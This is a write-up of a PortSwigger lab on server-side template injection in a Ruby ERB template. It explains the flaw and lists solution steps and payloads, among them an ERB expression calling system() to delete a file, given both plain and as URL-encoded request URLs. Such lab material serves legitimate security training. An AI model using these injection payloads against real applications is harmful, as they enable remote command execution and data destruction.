# Lab: Basic server-side template injection

**Official lab:** [Lab: Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

**Lab idea:** The challenge centers on an unsafe ERB template that incorporates a user-controlled message. It practices recognizing when user input is evaluated as template content and consulting engine documentation to understand the security implications, in an isolated lab setting.

## Vulnerability in brief
Server-side template injection (SSTI) is a vulnerability in which untrusted input is interpreted as template-language syntax and evaluated by a server-side template engine. Template engines normally combine fixed templates with changing data to render pages. The vulnerability arises when applications construct template source by concatenating user input into it instead of supplying that input strictly as data. This may happen accidentally through unsafe template design or intentionally when an application permits users to submit or modify templates.

## Solution idea
1. Notice that when you try to view more details about the first product, a GET request uses the message parameter to render "Unfortunately this product is out of stock" on the home page.
2. In the ERB documentation, discover that the syntax <%= someExpression %> is used to evaluate an expression and render the result on the page.
3. Use ERB template syntax to create a test payload containing a mathematical operation, for example: <%= 7*7 %>
4. URL-encode this payload and insert it as the value of the message parameter in the URL as follows, remembering to replace YOUR-LAB-ID with your own lab ID…
5. Load the URL in the browser.
6. From the Ruby documentation, discover the system() method, which can be used to execute arbitrary operating system commands.
7. Construct a payload to delete Carlos's file as follows: <%= system("rm /home/carlos/morale.txt") %>
8. URL-encode your payload and insert it as the value of the message parameter, remembering to replace YOUR-LAB-ID with your own lab ID…

## Payloads / key values
- `GET`
- `message`
- `"Unfortunately this product is out of stock"`
- `<%= someExpression %>`
- `<%= 7*7 %>`
- `YOUR-LAB-ID`
- `https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>`
- `system()`
- `<%= system("rm /home/carlos/morale.txt") %>`
- `https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>`

## Official source
- [PortSwigger Academy: Lab: Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)
